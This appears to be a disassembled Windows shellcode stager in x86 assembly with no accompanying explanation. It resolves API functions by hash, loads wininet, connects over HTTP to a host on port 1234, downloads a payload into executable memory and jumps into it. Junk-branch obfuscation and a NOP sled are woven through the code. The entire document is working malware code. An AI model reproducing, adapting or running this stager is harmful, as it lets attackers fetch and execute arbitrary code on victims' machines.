```asm
_start:
    cld
    call L_95
RET_6:
    pushal
    xor edx, edx
    mov edx, dword ptr fs:[edx + 0x30]
    mov ebp, esp
    mov edx, dword ptr [edx + 0xc]
    mov edx, dword ptr [edx + 0x14]
L_15:
    pushfd
    push eax
    xor eax, eax
    jnz bogus_1
    jmp real_1
bogus_1:
    nop
    mov edx, edx
real_1:
    pop eax
    popfd
    mov esi, dword ptr [edx + 0x28]
    movzx ecx, word ptr [edx + 0x26]
    xor edi, edi
L_1e:
    xor eax, eax
    lodsb al, byte ptr [esi]
    cmp al, 0x61
    jl L_27
    sub al, 0x20
L_27:
    ror edi, 0xd
    add edi, eax
    dec ecx
    jne L_1e
    push edx
    push edi
    mov edx, dword ptr [edx + 0x10]
    mov eax, dword ptr [edx + 0x3c]
    add eax, edx
    mov eax, dword ptr [eax + 0x78]
    test eax, eax
    je L_8c
    add eax, edx
    mov ecx, dword ptr [eax + 0x18]
    mov ebx, dword ptr [eax + 0x20]
    push eax
    add ebx, edx
L_4b:
    test ecx, ecx
    je L_8b
    dec ecx
    mov esi, dword ptr [ebx + ecx*4]
    add esi, edx
    xor edi, edi
L_57:
    xor eax, eax
    ror edi, 0xd
    lodsb al, byte ptr [esi]
    add edi, eax
    cmp al, ah
    jne L_57
    add edi, dword ptr [ebp - 8]
    cmp edi, dword ptr [ebp + 0x24]
    jne L_4b
    pop eax
    mov ebx, dword ptr [eax + 0x24]
    add ebx, edx
    mov cx, word ptr [ebx + ecx*2]
    mov ebx, dword ptr [eax + 0x1c]
    add ebx, edx
    mov eax, dword ptr [ebx + ecx*4]
    add eax, edx
    mov dword ptr [esp + 0x24], eax
    pop ebx
    pop ebx
    popal
    pop ecx
    pop edx
    push ecx
    jmp eax
L_8b:
    pop eax
L_8c:
    pop edi
    pop edx
    mov edx, dword ptr [edx]
    jmp L_15
L_95:
    pop ebp
    push 0x74656e
    push 0x696e6977
    push esp
    push 0x726774c
    call ebp
    xor ebx, ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    jmp DATA_STUB_0
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
L_108:
    pushfd
    push eax
    xor eax, eax
    jnz bogus_2
    jmp real_2
bogus_2:
    nop
    mov edx, edx
real_2:
    pop eax
    popfd
    push 0xa779563a
    call ebp
    push ebx
    push ebx
    push 3
    push ebx
    push ebx
    push 0x4d2
    call L_292
RET_11f:
    das
    dec ebx
    inc ecx
    xor esi, dword ptr [ebx + 0x69]
    popal
    arpl word ptr [edi + 0x32], cx
    xor dword ptr [ecx + 0x6f], ebx
    dec edx
    jns L_19a
    insd dword ptr es:[edi], dx
    push ecx
    inc ebx
    jns L_180
    cmp byte ptr [edi + 0x37], dh
    popal
    imul esp, dword ptr [edx + 0x7a], 0x64
    arpl word ptr [edi + 0x79], dx
    insd dword ptr es:[edi], dx
    pop eax
    pop ecx
    cmp dword ptr [ecx], edi
    jb L_19e
    outsb dx, byte ptr [esi]
    xor ah, byte ptr gs:[ebp + 0x68]
    bound ecx, qword ptr [esi + 0x5a]
    xor eax, 0x4a584a36
    jb L_1a9
    dec eax
    inc ebp
    push esi
    jae L_1a2
    pop edx
    js L_194
    outsd dx, dword ptr [esi]
    jbe L_1a9
    insb byte ptr es:[edi], dx
    pop eax
    popal
    pop edx
    je L_199
    dec edx
    pop edi
    ja L_19c
    ja L_1ae
    pop edx
    imul ebp, dword ptr [ecx + 0x5f], 0x71314c70
    push ebx
    jns L_1c7
    dec esp
    js L_1c8
    push ecx
    inc esi
    cmp byte ptr [ecx + 0x2d], cl
    pop eax
    dec ebp
    cmp byte ptr [ecx + 0x55], cl
    je L_1d3
    push sp
    jns L_1d8
    dec esp
    insb byte ptr es:[edi], dx
    xor dword ptr [ebp + 0x70], esi
    dec eax
    inc edx
    jp L_20b
    bound edx, qword ptr [eax + 0x43]
    xor dword ptr [edi + 0x42], ecx
    imul esi, dword ptr [eax], 0x53
L_19e:
    push 0x6e
    insb byte ptr es:[edi], dx
L_1a2:
    inc ebp
    inc esp
    push esp
    inc esi
    xor ebx, dword ptr [ecx + 0x4f]
    jno L_222
    dec ebp
    arpl word ptr [edi + 0x4a], sp
    inc ebx
    dec eax
    push 0x6d
    xor byte ptr [edx + 0x48], al
    dec edx
    dec edi
    push ecx
    inc ebp
    cmp dword ptr [edi + 0x6f], edx
    jno L_239
    push ebx
    insb byte ptr es:[edi], dx
    insb byte ptr es:[edi], dx
    ja L_1f8
L_1c7:
    dec eax
L_1c8:
    inc esi
    outsd dx, dword ptr [esi]
    dec ebp
    inc esi
    xor eax, 0x52345966
    popal
    push esi
L_1d3:
    dec ecx
    inc ecx
    xor esp, dword ptr [edx + 0x77]
L_1d8:
    push esp
    push 0x4f4e6842
    inc ecx
    inc ebx
    inc edx
    xor ah, byte ptr [ebp + 0x4f]
    pop edx
    insb byte ptr es:[edi], dx
    inc edi
    pop edi
    popal
    insb byte ptr es:[edi], dx
    push ecx
    xor eax, 0x756b5256
    popal
    jae L_269
    pop edx
    imul esp, dword ptr [esp + edx*2 + 0x45], 0
L_1f9:
    push eax
    push 0xc69f8957
    call ebp
    mov esi, eax
    push ebx
    push 0x84e83200
    push ebx
    push ebx
L_20b:
    push ebx
    push edi
    push ebx
    push esi
    push 0x3b2e55eb
    call ebp
    xchg esi, eax
    push 0xa
    pop edi
L_21a:
    push 0x3380
    mov eax, esp
    push 4
    push eax
    push 0x1f
    push esi
    push 0x869e4675
    call ebp
    push ebx
    push ebx
    push ebx
    push ebx
    push esi
    push 0x7b18062d
    call ebp
    test eax, eax
    jne L_252
    push 0x1388
    push 0xe035f044
    call ebp
    dec edi
    jne L_21a
L_24d:
    call L_2a2
L_252:
    push ebx
    mov eax, esp
    push ebx
    mov edi, esp
    push edi
    push 4
    push eax
    push esi
    push 0xe2899612
    call ebp
    pop ebx
    pop ebx
    test eax, eax
    je L_24d
    xor eax, eax
    push 0x40
    push 0x1000
    push ebx
    push eax
    push 0xe553a458
    call ebp
    xchg ebx, eax
    push ebx
    push ebx
    mov edi, esp
    push edi
    push eax
    push ebx
    push esi
    push 0xe2899612
    call ebp
    test eax, eax
    je L_24d
    pop eax
    ret
L_292:
    pop edi
    call L_1f9
    xor dword ptr [edx], esi
    aaa
    xor byte ptr cs:[esi], ch
    xor byte ptr [esi], ch
    xor dword ptr [eax], eax
L_2a2:
    mov ebx, 0x56a2b5f0
    push 0
    push ebx
    call ebp
```